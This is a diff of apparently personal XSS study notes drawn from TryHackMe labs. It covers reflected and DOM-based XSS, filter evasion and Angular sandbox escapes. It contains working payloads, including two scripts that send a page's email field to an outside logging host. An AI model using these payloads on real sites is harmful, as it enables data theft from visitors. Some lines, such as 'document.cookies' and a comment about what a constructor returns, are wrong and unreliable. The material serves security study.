@@ -14,8 +14,9 @@ http://www.xss-payloads.com/
 
 
 ## Reflected XSS
-User-supplied data in an HTTP request is included in the webpage source without any validation.
+The server-side application processes data from a request and echoes the data in the response. 
 
+User-supplied data in an HTTP request is included in the webpage source without any validation.
 The JavaScript is executed because it is in the HTTP response
 
 Only affects the person making the web request.
@@ -25,10 +26,37 @@ Only affects the person making the web request.
 `<script>alert(“Hello World”)</script>`
 `</textarea><script>alert('THM');</script>`
 
+
+```
+// from "https://tryhackme.com/r/room/thatstheticket"
+</textarea>
+<script>
+var i = new Image(); i.src="//TEST.1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech/?c="+document.getElementById('email').innerHTML;
+</script>
+
+</textarea>
+<script>
+var email = (document.getElementById('email').innerHTML).replace("@","-at-");
+var my_address = "1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech";
+var request = new XMLHttpRequest();
+request.open("GET","http://" + email + "-musyoka-" + my_address, false); // with second parameter as 'true'(async) also works
+request.send();
+</script>
+```
+
+
+
 `<script>alert(document.cookies)</script>`
 `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
 
-/images/cat.jpg" onload="alert('THM');
+`/images/cat.jpg" onload="alert('THM');`
+
+`"onmouseover="alert(1)` Example:
+<input type="text" placeholder="Search the blog..." name="search"
+value="[PAYLOAD HERE]">
+
+
+
 
 
 
@@ -37,6 +65,13 @@ Only affects the person making the web request.
 
 ### Avoid Filters
 `<sscriptcript>alert('THM');</sscriptcript>`
+
+
+Search:
+`\"-alert(1)}//`
+
+
+
 
 
 
@@ -65,6 +100,8 @@ Examples:
 
 
 
+anchor href attribute
+<a href="javascript:alert(1)">
 
 
 
@@ -74,6 +111,10 @@ Examples:
 
 
 ## DOM-based XSS
+When JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.
+
+The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.
+
 The "sinks" manipulate the DOM, and then the DOM causes the JavaScript to execute.
 
 - document.write
@@ -105,7 +146,25 @@ modified: https://example.path/feedback?returnPath=javascript:alert(document.coo
 
 
 
+### Angular
+`{{$on.constructor('alert(1)')()}}`
+`{{$eval.constructor('alert(1)')()}}`
+`{{$resume.constructor('alert(1)')()}}`
+- The constructor data property of an Object instance returns a reference to the constructor function that created the instance object. <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor>
 
+Explanation:
+`Function('console.log("Hello World")')(); // anonymous function made using the Function constructor`
+
+```
+function test() {
+	console.log('Hello World');
+}
+
+console.log(test.constructor); // returns "Hello World"
+
+let mySecondFunction = test.constructor('console.log("Hello World 2!")');
+mySecondFunction(); // returns "Hello World 2!"
+```
 
 
 
